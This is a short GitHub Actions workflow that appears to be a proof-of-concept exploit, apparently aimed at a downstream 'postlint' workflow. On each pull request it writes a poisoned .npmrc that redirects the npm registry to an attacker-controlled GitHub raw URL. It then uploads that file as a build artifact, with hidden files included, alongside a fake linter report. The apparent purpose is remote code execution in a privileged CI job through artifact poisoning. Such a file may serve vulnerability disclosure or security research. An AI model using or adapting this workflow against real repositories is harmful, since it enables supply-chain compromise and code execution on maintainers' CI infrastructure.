name: Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Save PR number
        run: echo "${{ github.event.pull_request.number }}" > pr-number.txt
      - name: Build artifact contents (attacker controlled)
        run: |
          mkdir -p out
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-postlint/adp-rce/npmreg/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
          printf 'attacker controlled linter report\n' > out/linter-report.txt
          cp pr-number.txt out/pr-number.txt
          cat out/.npmrc
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            out/.npmrc
            out/linter-report.txt
            out/pr-number.txt
          include-hidden-files: true
